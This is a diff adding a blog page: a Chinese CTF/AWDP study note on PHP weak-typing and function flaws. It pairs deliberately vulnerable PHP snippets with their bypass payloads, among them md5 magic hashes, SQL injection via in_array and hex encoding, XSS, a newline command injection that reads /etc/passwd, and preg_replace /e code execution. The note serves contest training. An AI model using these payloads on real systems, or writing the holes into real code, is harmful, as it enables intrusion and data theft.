@@ -1,0 +1,641 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>awdp知识点总结 | d1e4f1ag&#39;s land</title>
+    <meta name="author" content="d1e4f1ag" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar2.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/640.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>D1E4F1AG&#39;S LAND</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/link">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;Link</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;D1E4F1AG&#39;S LAND</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+                <a href="/link">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Link</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>awdp知识点总结</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/2
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/" style="color: #03a9f4">
+                    知识点
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>PHP + JS知识点总结</p>
+<span id="more"></span>
+
+<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="九大全局变量"><a href="#九大全局变量" class="headerlink" title="九大全局变量"></a>九大全局变量</h2><pre><code>$_POST：用于接收post提交的数据
+$_GET ：用于获取url地址栏的参数数据
+$_FILES ：用于文件接收的处理， img 最常见
+$_COOKIE ：用于获取与setCookie()中的name 值
+$_SESSION ：用于存储session的值或获取session中的值
+$_REQUEST ：具有get、post的功能，但比较慢
+$_SERVER：预定义服务器变量的一种
+$GLOBALS ：一个包含了全部变量的全局组合数组
+$_ENV ：是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它
+</code></pre>
+<h1 id="二、弱类型以及各种函数"><a href="#二、弱类型以及各种函数" class="headerlink" title="二、弱类型以及各种函数"></a>二、弱类型以及各种函数</h1><h2 id="精度缺陷"><a href="#精度缺陷" class="headerlink" title="精度缺陷"></a>精度缺陷</h2><p>在用PHP进行浮点数的运算中,经常会出现一些和预期结果不一样的值，这是由于浮点数的精度有限<br>尽管取决于系统，PHP 通常使用 IEEE 754 双精度格式，则由于取整而导致的最大相对误差为 1.11e-16<br>非基本数学运算可能会给出更大误差，并且要考虑到进行复合运算时的误差传递</p>
+<p>下面看一个有趣的例子感受下:<br><img src="https://s2.loli.net/2024/06/02/GfiqztS2m1yUc7d.png"></p>
+<p>以十进制能够精确表示的有理数如 0.1 或 0.7，无论有多少尾数都不能被内部所使用的二进制精确表示<br>因此不能在不丢失一点点精度的情况下转换为二进制的格式</p>
+<p>这就会造成混乱的结果：<br>例如，floor((0.1+0.7)*10) 通常会返回 7 而不是预期中的 8，因为该结果内部的表示其实是类似 7.9999999999999991118…</p>
+<h2 id="类型转换缺陷"><a href="#类型转换缺陷" class="headerlink" title="类型转换缺陷"></a>类型转换缺陷</h2><p>PHP弱类型语言的一个特性，当一个整形和一个其他类型比较的时候，会先把其他类型intval数字化再比</p>
+<pre><code class="php">&lt;?php
+    error_reporting(0);
+    $flag = &#39;flag&#123;test&#125;&#39;;
+    $id = $_GET[&#39;id&#39;];
+    is_numeric($id)?die(&quot;Sorry....&quot;):NULL;    
+    if($id&gt;2020)&#123;
+        echo $flag;
+    &#125;
+?&gt;
+</code></pre>
+<p>既要传入非数字，又要比2020大<br>那就传个<code>?id=2021a</code>即可</p>
+<h2 id="弱等于和强等于"><a href="#弱等于和强等于" class="headerlink" title="弱等于和强等于"></a>弱等于和强等于</h2><p><img src="https://s2.loli.net/2024/06/02/GfiqztS2m1yUc7d.png" alt="20201125225743380.png"><br><img src="https://s2.loli.net/2024/06/02/2CJq4FnieuAslaL.png" alt="20201125231708898.png"></p>
+<p>尤其要关注的是<code>==</code>和<code>===</code></p>
+<ul>
+<li><code>==</code>会先将字符串类型转换成相同，再比较</li>
+<li><code>===</code>会先判断两种字符串的类型是否相等，再比较</li>
+</ul>
+<p><img src="https://s2.loli.net/2024/06/02/vpOuI2QriZJaVfe.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2024/06/02/euaTDQYk2JSbrfs.png" alt="20201125231735174.png"></p>
+<pre><code class="php">&#39;a&#39;==0   //true
+&#39;12a&#39;==12  //true
+&#39;1&#39;==1   //true
+&#39;1aaaa55sss66&#39;==1  //true
+1==true==&quot;1&quot;   //true
+
+&quot;0e123&quot; == &quot;0e456&quot;  //true，0e这类字符串识为科学技术法的数字,0的无论多少次方都是零，所以相等
+&quot;0e123&quot; == &quot;0eabc&quot;  //flase，科学计数的指数不可以包含字母  
+</code></pre>
+<pre><code>QNKCDZO
+0e830400451993494058024219903391
+  
+s878926199a
+0e545993274517709034328855841020
+  
+s155964671a
+0e342768416822451524974117254469
+  
+s214587387a
+0e848240448830537924465865611904
+  
+s214587387a
+0e848240448830537924465865611904
+  
+s878926199a
+0e545993274517709034328855841020
+  
+s1091221200a
+0e940624217856561557816327384675
+  
+s1885207154a
+0e509367213418206700842008763514
+  
+s1502113478a
+0e861580163291561247404381396064
+  
+s1885207154a
+0e509367213418206700842008763514
+  
+s1836677006a
+0e481036490867661113260034900752
+  
+s155964671a
+0e342768416822451524974117254469
+  
+s1184209335a
+0e072485820392773389523109082030
+  
+s1665632922a
+0e731198061491163073197128363787
+  
+s1502113478a
+0e861580163291561247404381396064
+  
+s1836677006a
+0e481036490867661113260034900752
+  
+s1091221200a
+0e940624217856561557816327384675
+  
+s155964671a
+0e342768416822451524974117254469
+  
+s1502113478a
+0e861580163291561247404381396064
+  
+s155964671a
+0e342768416822451524974117254469
+  
+s1665632922a
+0e731198061491163073197128363787
+  
+s155964671a
+0e342768416822451524974117254469
+  
+s1091221200a
+0e940624217856561557816327384675
+  
+s1836677006a
+0e481036490867661113260034900752
+  
+s1885207154a
+0e509367213418206700842008763514
+  
+s532378020a
+0e220463095855511507588041205815
+  
+s878926199a
+0e545993274517709034328855841020
+  
+s1091221200a
+0e940624217856561557816327384675
+  
+s214587387a
+0e848240448830537924465865611904
+  
+s1502113478a
+0e861580163291561247404381396064
+  
+s1091221200a
+0e940624217856561557816327384675
+  
+s1665632922a
+0e731198061491163073197128363787
+  
+s1885207154a
+0e509367213418206700842008763514
+  
+s1836677006a
+0e481036490867661113260034900752
+  
+s1665632922a
+0e731198061491163073197128363787
+  
+s878926199a
+0e545993274517709034328855841020
+</code></pre>
+<h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h2><p>这是个比较字符串的函数</p>
+<pre><code class="php">int strcmp ( string $str1 , string $str2 )
+</code></pre>
+<p>如果 str1 小于 str2 返回 &lt; 0<br>如果 str1 大于 str2 返回 &gt; 0<br>如果两者相等，返回 0<br>问题</p>
+<p>在PHP版本为5.3.3至5.5中（不包含5.5），当比较数组和字符串的时候，返回值也是0</p>
+<pre><code class="php">&lt;?php
+$password=$_GET[&#39;password&#39;];
+if(strcmp(&#39;am0s&#39;,$password))&#123;
+    echo &#39;false!&#39;;
+&#125;else&#123;
+    echo &#39;success!&#39;;
+&#125;
+?&gt;
+</code></pre>
+<p>绕过</p>
+<pre><code>?password[]=1
+</code></pre>
+<p>除了strcmp()函数外，ereg()和strpos()函数在处理数组的时候也会异常，返回NULL</p>
+<h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><p>用于获取变量的整数值<br>在转换时，函数会从字符串起始处进行转换直到遇到一个非数字的字符<br>即使出现无法转换的字符串也不会报错而是返回0</p>
+<pre><code class="php">&lt;?php
+$a = $_GET[&#39;a&#39;];
+if (intval($a) === 666) &#123;
+    $sql = &quot;Select a From Table Where Id=&quot;.$a;
+    echo $sql;
+&#125; else &#123;
+    echo &quot;No...&quot;;
+&#125;
+?&gt;
+</code></pre>
+<h2 id="sha1-和md5-加密函数"><a href="#sha1-和md5-加密函数" class="headerlink" title="sha1() 和md5()加密函数"></a>sha1() 和md5()加密函数</h2><p>都用于计算字符串的散列值<br>但是两者都无法处理数组，不会抛出异常而是直接返回NULL</p>
+<h2 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str()函数"></a>parse_str()函数</h2><p>解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量</p>
+<pre><code class="php">void parse_str ( string $str [, array &amp;$arr ] )
+</code></pre>
+<p>当parse_str()函数的参数值可以被用户控制时，则存在变量覆盖漏洞</p>
+<pre><code class="php">&lt;?php
+$a = &#39;oop&#39;;
+parse_str($_SERVER[&quot;QUERY_STRING&quot;]);
+
+if ($a == &#39;mi1k7ea&#39;) &#123;
+    echo &quot;Hacked!&quot;;
+&#125; else &#123;
+    echo &quot;Hello!&quot;;
+&#125;
+?&gt;
+</code></pre>
+<p>结合：</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+if(empty($_GET[&#39;id&#39;])) &#123;
+    show_source(__FILE__);
+    die();
+&#125; else &#123;
+    include (&#39;flag.php&#39;);
+    $a = &quot;www.xxx.com&quot;;
+    $id = $_GET[&#39;id&#39;];
+    @parse_str($id);
+    if ($a[0] != &#39;QNKCDZO&#39; &amp;&amp; md5($a[0]) == md5(&#39;QNKCDZO&#39;)) &#123;
+        echo $flag;
+    &#125; else &#123;
+        exit(&#39;so easy!&#39;);
+    &#125;
+&#125;
+?&gt;
+</code></pre>
+<p>绕过：</p>
+<pre><code>?b=a[0]=240610708
+</code></pre>
+<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h2><p>用于检测变量是否为数字或数字字符串</p>
+<p>可被十六进制的值进行绕过</p>
+<pre><code class="php">&lt;?php
+$name = $_GET[&#39;name&#39;];
+$con = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;hehe123&quot;);
+if (!$con)
+&#123;
+    die(&#39;Could not connect: &#39; . mysql_error());
+&#125;
+
+mysql_select_db(&quot;test&quot;, $con);
+if (is_numeric($name)) &#123;
+    mysql_query(&quot;insert into users values (3,&quot; . $name . &quot;,&#39;test&#39;)&quot;);
+&#125;
+?&gt;
+</code></pre>
+<pre><code>1′ union select 1,2,3的十六进制为0x312720756e696f6e2073656c65637420312c322c33
+绕过
+
+?name=0x312720756e696f6e2073656c65637420312c322c33
+</code></pre>
+<h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h2><p>用来判断一个值是否在某一个数组列表里面<br>其缺陷在于存在自动类型转换<br>当输入数字1后再紧跟其他字符串能够Bypass检测数组的功能</p>
+<pre><code class="php">&lt;?php
+$id = $_GET[&#39;id&#39;];
+if (in_array($id, array(1,2,3,4,5,6,7,8,9,0))) &#123;
+    $sql = &quot;Select a From users Where Id=&#39;&quot;.$id.&quot;&#39;&quot;;
+    echo $sql;
+&#125; else &#123;
+    echo &quot;No...&quot;;
+&#125;
+?&gt;
+
+?id=1&#39;union select * from users#
+</code></pre>
+<h2 id="ereg-和eregi"><a href="#ereg-和eregi" class="headerlink" title="ereg()和eregi()"></a>ereg()和eregi()</h2><p>用于正则匹配，两者的区别在于是否区分大小写<br>使用指定的模式搜索一个字符串中指定的字符串，如果匹配成功则返回true，否则返回false</p>
+<p>该函数可被<code>%00</code>截断来Bypass<br>传入数组之后，ereg是返回NULL</p>
+<pre><code class="php">&lt;?php
+$passwd = $_GET[&#39;passwd&#39;];
+if (@ereg(&quot;^[a-zA-Z0-9_]+$&quot;, $passwd)) &#123;
+    $sql = &quot;Select username From users Where password=&#39;&quot;.$passwd.&quot;&#39;&quot;;
+    echo $sql;
+&#125; else &#123;
+    echo &quot;No...&quot;;
+&#125;
+?&gt;
+</code></pre>
+<p><img src="https://s2.loli.net/2024/06/02/ryLA2tXV5zOgq1C.png" alt="image.png"></p>
+<h2 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode()"></a>json_decode()</h2><p>用于对json格式数据进行json解码操作，对于一个json类型的字符串，会解密成一个数组</p>
+<p>其存在一个<code>0==&quot;efeaf&quot;</code>的Bypass</p>
+<pre><code class="php">&lt;?php
+$key = &quot;JsonTest&quot;;
+if (isset($_GET[&#39;data&#39;])) &#123;
+    $data = json_decode($_GET[&#39;data&#39;]);
+    if ($data-&gt;key == $key) &#123;
+        echo &quot;Bypass json_decode()!&quot;;
+    &#125; else &#123;
+        echo &quot;No...&quot;;
+    &#125;
+&#125;
+?&gt;
+
+?data=&#123;&quot;key&quot;:0&#125;
+</code></pre>
+<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><pre><code>用于执行一个正则表达式匹配
+
+int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )
+1
+$pattern ：要搜索的模式，字符串形式
+$subject： 要搜索检测的目标字符串
+$matches： 如果提供了参数matches，它将被填充为搜索结果 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推
+$flags： 可设置标记值
+$offset： 可选参数 offset 用于指定从目标字符串的某个未知开始搜索(单位是字节)
+
+/i 修饰符
+大小写不敏感
+
+&lt;?php
+      error_reporting(0);
+    $name =  $_GET[&quot;name&quot;];
+        if (preg_match(&#39;/script/&#39;, $_GET[&quot;name&quot;])) &#123;
+        die(&#39;hacker&#39;);
+    &#125;
+    echo $name;
+?&gt;
+1
+2
+3
+4
+5
+6
+7
+8
+绕过
+
+?name=&lt;Script&gt;alert(2333)&lt;/Script&gt;
+1
+/m 修饰符
+多行匹配
+当出现换行符 %0a的时候，会被当做两行处理
+此时只可以匹配第 1 行，后面的行就会被忽略
+
+&lt;?php
+  if (!(preg_match(&#39;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m&#39;, $_GET[&#39;ip&#39;]))) &#123;
+     die(&quot;Invalid IP address&quot;);
+  &#125;
+  system(&quot;ping -c 2 &quot;.$_GET[&#39;ip&#39;]);
+?&gt;
+1
+2
+3
+4
+5
+6
+绕过
+
+ip=127.0.0.1%0acat /etc/passwd
+</code></pre>
+<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><pre><code>执行一个正则表达式的搜索和替换
+
+preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed
+1
+$pattern ：要搜索的模式，可以是字符串或一个字符串数组
+$replacement ：用于替换的字符串或字符串数组
+$subject： 要搜索替换的目标字符串或字符串数组
+$limit： 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）
+$count： 可选，为替换执行的次数
+
+/e修饰符
+使 preg_replace() 将 replacement 参数当作 PHP 代码
+
+1、无限传参
+
+&lt;?php
+    echo preg_replace($_GET[&quot;pattern&quot;], $_GET[&quot;new&quot;], $_GET[&quot;base&quot;]);
+?&gt;
+
+绕过
+?pattern=/233/e&amp;new=phpinfo()&amp;base=233
+
+2、简单正则
+
+&lt;?php
+    error_reporting(0);
+    include(&#39;flag.php&#39;);
+
+    $pattern = $_REQUEST[&quot;pattern&quot;];
+    $new = $_POST[&quot;new&quot;];
+    $base = &#39;2333&#39;;
+    preg_replace(
+        $pattern,
+        $new,
+        $base
+    );
+?&gt;
+
+绕过
+?pattern=/\d/e
+
+3、进阶正则
+
+&lt;?php
+    error_reporting(0);
+
+    function complexStrtolower($regex, $value)&#123;
+        return preg_replace(&#39;/(&#39;.$regex.&#39;)/ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, $value);
+    &#125;
+
+    foreach($_REQUEST as $regex =&gt; $value)&#123;
+        echo complexStrtolower($regex, $value) . &quot;\n&quot;;
+    &#125;
+
+    highlight_file(__FILE__);
+?&gt;
+绕过：
+\S+=&#123;$&#123;phpinfo()&#125;&#125; 
+</code></pre>
+<h2 id="register-globals全局变量覆盖"><a href="#register-globals全局变量覆盖" class="headerlink" title="register_globals全局变量覆盖"></a>register_globals全局变量覆盖</h2><p>php.ini中有一项为register_globals，即注册全局变量</p>
+<p>register_globals&#x3D;On时，传递过来的值会被直接的注册为全局变量直接使用<br>register_globals&#x3D;Off时，我们需要到特定的数组里去得到它<br>PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除<br>当register_globals&#x3D;On，变量未被初始化且能够用户所控制时，就会存在变量覆盖漏洞</p>
+<pre><code class="php">&lt;?php
+echo &quot;Register_globals: &quot; . (int)ini_get(&quot;register_globals&quot;) . &quot;&lt;br/&gt;&quot;;
+if ($a) &#123;
+  echo &quot;Hacked!&quot;;
+&#125;
+?&gt;
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2024 - 2024 d1e4f1ag&#39;s land
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;d1e4f1ag
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
